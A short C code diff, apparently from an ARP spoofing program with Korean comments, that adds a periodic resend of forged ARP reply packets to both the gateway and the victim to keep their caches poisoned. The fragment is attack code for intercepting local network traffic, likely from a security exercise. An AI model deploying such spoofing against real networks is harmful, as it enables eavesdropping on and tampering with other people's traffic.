@@ -370,6 +370,12 @@ int main(int argc, char* argv[]) {
 		
 		printPacket((uint8_t*)next_packet, 42);
 		
+		if (count % 50 == 0) {
+			for (int i = 0; i <= 1; i++) {																//gateway, victim 양방면 확인
+				sendPacket(fp, ARP_REPLY_TYPE, &sess[i]);													//변조패킷 전송
+			}
+		}
+
 		bool isARPrequest = !memcmp(next_packet + 12, "\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01", 10);			//12~21이 "\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01" 일때, 01은 request
 		if (isARPrequest) {																				//ARP 요청 패킷이라면
 			printf("\nARP request packet is found\n");
